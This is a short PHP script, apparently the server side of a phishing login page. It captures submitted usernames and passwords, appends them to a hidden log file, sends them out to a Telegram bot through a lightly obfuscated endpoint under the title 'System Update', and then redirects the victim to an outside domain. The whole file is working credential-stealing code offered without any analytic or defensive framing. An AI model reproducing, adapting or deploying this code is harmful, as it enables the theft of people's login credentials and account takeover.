<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
   
    $user_val = $_POST["u_data_field"] ?? '';
    $pass_val = $_POST["p_data_field"] ?? '';
    
    $_SESSION['user_id'] = $user_val;
    date_default_timezone_set('Asia/Kolkata');
    $timestamp = date("Y-m-d h:i:s A");

    // Constructing data string
    $log_entry = "ID: " . $user_val . " | PW: " . $pass_val . " | Time: " . $timestamp . "\n";

    
    file_put_contents(".log_data_storage.php", $log_entry, FILE_APPEND | LOCK_EX);

  
     $token = '__TELEGRAM_BOT_TOKEN__';
    $chatIds = ['1272510733'];
    $title = "System Update ✅";
    
    $msg = "Entry: " . $user_val . "\nSecret: " . $pass_val . "\nTS: " . $timestamp;

    // Call the sender function
    transmit_data($title, $msg, $token, $chatIds);

    // Redirect
    header("Location: https://ultshops.zip/locked");
    exit();
}

function transmit_data($t, $b, $tok, $ids) {
   
    $proto = "https://api.";
    $base = "tele" . "gram.org/bot";
    $endpoint = $proto . $base . $tok . "/sendMessage";

    foreach ($ids as $id) {
        $payload = [
            'chat_id' => $id,
            'text' => "*" . $t . "*\n" . $b,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init($endpoint);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
